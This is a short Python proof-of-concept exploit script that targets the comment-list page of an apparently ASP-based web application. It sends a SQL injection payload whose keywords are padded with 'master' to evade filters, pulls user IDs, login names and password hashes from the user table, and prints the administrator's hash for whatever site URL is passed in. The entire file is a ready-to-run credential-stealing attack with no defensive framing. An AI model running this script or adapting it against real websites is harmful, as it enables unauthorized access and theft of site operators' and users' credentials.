#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#author: myh0st@xazlsec

import base64
import requests
import urllib3
import sys
import json
import re

urllib3.disable_warnings()

patt = "<div class=\"line2\">(.*?)</div>"

def verify(site):
    burp0_url = site + "/plug/comment/commentList.asp?id=-1%20unmasterion%20semasterlect%20top%201%20UserID,GroupID,LoginName,Password,now(),null,1%20%20frmasterom%20{prefix}user"
    burp0_headers = {"Content-Type": "application/xml"}
    r = requests.get(burp0_url, headers=burp0_headers, verify=False)
    if r.status_code == 200 and "UserID,GroupID,LoginName,Password" in r.text and "clistbox" in r.text:
        return re.findall(patt, r.text)[0]
    else:
        return ""


if __name__=="__main__":
    target = sys.argv[1]
    info = verify(target)
    if info != "":
        print("[+]漏洞存在，获取管理员密码哈希为：", info)
    else:
        print("[-]漏洞不存在")
